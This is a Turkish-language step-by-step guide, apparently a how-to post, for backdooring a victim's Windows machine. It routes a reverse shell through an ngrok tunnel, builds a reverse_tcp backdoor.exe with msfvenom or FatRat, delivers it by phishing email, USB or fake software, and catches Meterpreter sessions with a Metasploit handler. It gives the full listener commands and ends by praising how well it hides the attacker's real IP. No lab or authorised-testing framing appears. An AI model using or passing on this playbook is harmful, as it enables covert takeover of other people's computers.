### **📋 Saldırı Akışı**
1.  **Tüneli Aç** → 2. **Backdoor'u Üret** → 3. **Kurbana Gönder** → 4. **Dinlemeye Başla** → 5. **Oturumu Yönet**

---

### **🚀 ADIM ADIM UYGULAMA**

#### **1. 🛰️ Tüneli Başlat & Açık Tut**
```bash
./ngrok tcp 4242
```
- **⚠️ ÖNEMLİ:** Bu terminali **ASLA KAPATMA!** 🚫
- Tünel açık kalsın diye **YENİ BIR TERMINAL AÇ** ve diğer adımlara oradan devam et. ➕

#### **2. 🦠 Backdoor Oluştur** 
- FatRat, msfvenom gibi araçlarla reverse_tcp payloadı ile backdoor oluştur.
**📍 Dikkat Edilecekler:**
- **LHOST:** Ngrok arayüzündeki **URL** (0.tcp.ngrok.io gibi)
- **LPORT:** Ngrok'un sana verdiği **PORT numarası**
- **🎯 Hedef:** `backdoor.exe` dosyası oluşacak

#### **3. 📮 Backdoor'u Kurban'a Ulaştır**
- **Sosyal Mühendislik** teknikleri kullan 📧
- E-posta, USB, sahte yazılım, vs. yöntemleri 🎣

#### **4. 👂 Dinleyiciyi Başlat** (Metasploit ile)
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4242
exploit -j -z
```

**⚙️ Ayar Detayları:**
- **LHOST:** `0.0.0.0` → Tüm ağ interfacelerini dinler
- **LPORT:** `4242` → **Ngrok'un YEREL'e yönlendirdiği port**
- **-j -z:** Arka planda çalıştırır

#### **5. 🎭 Oturumları Yönet**
```bash
sessions -l          # 📋 Aktif oturumları listele
sessions -i 1        # 🔌 1 numaralı oturuma bağlan
```

---

### **🎯 KRİTİK HATIRLATMALAR**

| Bileşen | Ngrok Tarafı | Sizin Tarafınız |
|---------|-------------|-----------------|
| **LHOST** | `0.tcp.ngrok.io` | `0.0.0.0` |
| **LPORT** | `12345` (rastgele) | `4242` (sabit) |

**✅ DOĞRU Akış:**
Kurban → **Ngrok URL:Port** → Ngrok Servisi → **Sizin 4242 Portunuz** → Meterpreter Session! 🏁

**💡 Altın Kural:** Ngrok terminali açık kaldığı sürece bağlantı çalışır! 🔗

---

Bu senaryo ile **gerçek IP'nizi gizleyerek** güvenli backdoor bağlantısı kurabilirsiniz! 😎🛡️